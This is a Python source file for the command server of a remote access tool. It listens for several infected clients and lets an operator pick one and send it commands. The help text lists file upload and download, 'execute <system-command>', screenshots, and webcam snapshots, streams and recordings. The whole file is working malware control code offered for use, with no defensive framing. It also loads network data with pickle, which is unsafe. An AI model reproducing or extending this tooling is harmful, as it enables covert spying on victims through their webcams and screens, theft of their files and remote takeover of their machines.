import socket
import os
import pickle
from tqdm import tqdm
import cv2
from datetime import datetime
import threading
from colorama import Fore, Back, Style
import time 

SERVER_IP = "127.0.0.1"
PORT = 4444


def shell(connection, command):
    try:
        connection.send(pickle.dumps(command))
    except BrokenPipeError:
        pass
    
    command = word_splitter(command)

    if command[0] == 'upload':
        read_path = os.path.abspath(command[1])
            
        upload_file(read_path, connection)
       
    elif command[0] == 'download':
        try:
            write_path = os.path.abspath(command[2])

        except IndexError:
            
            write_path = os.path.join(os.getcwd(), receive_pickled(connection))


        download_file(write_path, connection)

    elif command[0] == "screenshot":
        if len(command) == 1:
            download_file(os.path.join(os.getcwd(),(filename_with_date() + '.png')),connection)
        else:
            download_file(os.path.join(os.path.abspath(command[1]), (filename_with_date() + '.png')), connection)
    
    elif " ".join(command[0:2]) == 'webcam stream':
        while True:
            packet = connection.recv(1024)
            if packet[-4:] == b"<TR>":
                cv2.destroyAllWindows()
                break

            packet = packet[5:]
            while packet:
                data = connection.recv(1024)
                if data[:5] == b'<FIN>':
                    null_bytes_lenght = data[5:data.find(b"<SIZ>")]
                    packet = packet[:-int(null_bytes_lenght.decode())]
                    break
                packet += data


            frame = pickle.loads(packet)
            cv2.imshow("Received Frame", frame)
    
            if cv2.waitKey(1) & 0xFF == ord("q"):
                break
                

    else:
        print(receive_pickled(connection))


def word_splitter(text):
    words = []
    word = ""
    in_word = False
    
    for char in text:
        if char == "'":
            in_word = not in_word
        elif char == " " and not in_word:
            words.append(word)
            word = ""
        else:
            word += char
    
    words.append(word)
    
    return words


def send_pickled(text, connection):
    data = pickle.dumps(text)
    connection.send(f"{len(data):<8}".encode()+data)

def receive_pickled(connection):
    try:
        buffer_size = int(connection.recv(8).strip().decode())
        return pickle.loads(connection.recv(buffer_size))
    except ValueError:
        pass

def upload_file(path, connection):
    buffer_size = 1024
    file_size = os.path.getsize(path)
    progress_bar = tqdm(total=file_size, unit="B", unit_scale=True, unit_divisor=1024, position=0, leave=True)   


    if file_size < 4096:
        with open(path, 'rb') as file_to_read:

            data = file_to_read.read()
            data = pickle.dumps(data)

            pickle_size = len(data)
            send_pickled(pickle_size, connection)
            connection.send(data)
            progress_bar.update(file_size)

    else:

        send_pickled(file_size, connection)
        
        with open(path, 'rb') as file_to_read:
            data = file_to_read.read(buffer_size)

            while data:
                connection.send(data)
                progress_bar.update(len(data))
                data = file_to_read.read(buffer_size)

            connection.send(b'<TERM>')


def filename_with_date() -> str: 
    return str(datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p"))


def download_file(path, connection):
    buffer_size = 1024
    file_size = receive_pickled(connection)


    if file_size < 4096:
        data = connection.recv(file_size)
        progress_bar = tqdm(total=file_size, unit="B", unit_scale=True, unit_divisor=1024, position=0, leave=True)   

        with open(path, 'wb') as file_to_write:
            data = pickle.loads(data)
            bytes_written = file_to_write.write(data)
            progress_bar.update(file_size)
    else:

        progress_bar = tqdm(total=file_size, unit="B", unit_scale=True, unit_divisor=1024, position=0, leave=True)   
        with open(path, 'wb') as file_to_write:
            data = connection.recv(buffer_size)

            while data:
                if data[-6:] == b'<TERM>':
                    data = data[:-6]
                    bytes_written = file_to_write.write(data)
                    progress_bar.update(bytes_written)
                    break

                bytes_written = file_to_write.write(data)
                data = connection.recv(buffer_size)
                progress_bar.update(bytes_written)

def is_clients_alive(address_list):
    try:
        for i,j in enumerate(address_list):
            clients[i].send(pickle.dumps("<CHK_ALIVE>"))
            if pickle.loads(clients[i].recv(1024)) == "<IM_ALIVE>":
                print(Fore.CYAN + str(i) + " - " + " ".join([str(i) for i in j]) + Fore.RESET)
                            
    except:
        clients.pop(i)
        address = addresses.pop(i)
        if not len(address_list[i:]) == 0:
            is_clients_alive(address_list[i:])    
        print(f"[-] {address} has left.")

def is_client_alive(client):
    try:        
        client.send(pickle.dumps("<CHK_ALIVE>"))
        if pickle.loads(client.recv(1024)) == "<IM_ALIVE>":
            return True
    except:
        return False

if __name__ == '__main__':
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((SERVER_IP, PORT))

        addresses = []
        clients = []

        def handle_incoming_connections():
            server.listen()
            
            print(Style.BRIGHT+Fore.LIGHTGREEN_EX+f"[+] Server started on {SERVER_IP}:{PORT}"+Fore.RESET)

            while True:

                connection, address = server.accept()
                client_index = len(clients)

                print(Style.BRIGHT+Fore.GREEN+f"[+] Client {client_index} ({address[0]}:{address[1]}) connected."+Fore.RESET)
                
                clients.append(connection)
                addresses.append(address)



        def send_command():

            while True:
                is_clients_alive(addresses)
                command = input(Fore.BLUE + Style.BRIGHT + ">> " + Fore.RESET)
                splitted_command = word_splitter(command)

                if splitted_command[0] == 'help':
                    print('Listing available commands:\n- help\n- show clients\n- select <client-index>')
                
                elif command == 'show clients':
                    continue
                elif splitted_command[0] == "select" and len(splitted_command) == 2:
                    client_index = int(splitted_command[1])
                    if len(clients) <= client_index or len(clients)==0:
                        print(f"[-] There is NOT a client with entered index! Next time type a valid one.")
                        break

                    print( Fore.GREEN + f"[+] {addresses[client_index][0]}:{addresses[client_index][1]} is selected. (Use help for available commands.)" + Fore.RESET)
                    while True:
                        command = input(Fore.RED + Style.BRIGHT + ">> " + Fore.RESET)
                        if command == 'exit':
                            break
                        elif command == 'help':
                            print("Listing available commands:\n- cd <parameter>. Parameters: <..>, <>, <folder-name>\n- ls\n- rm <file-name>\n- cp <from> <to>\n- mv <from> <to>\n- pwd\n- upload <filepath-from-server> <filepath/filename-to-client>\n- execute <system-command>\n- download <filepath/filename-from-client> <filepath/filename-to-server>\n- screenshot <save-path>\n- webcam shot\n- webcam stream <duration(integer)>\n- webcam record <duration(integer)>")
                            continue
                        else:
                            if is_client_alive(clients[client_index]):
                                shell(clients[client_index],command)
                            else:
                                break
                else:
                    print(f"[-] {command} couldn't recognised. Please enter a valid command.")
        
        thread1 = threading.Thread(target=handle_incoming_connections)
        thread2 = threading.Thread(target=send_command)
            
        thread1.start()
        thread2.start()

    except:
        pass
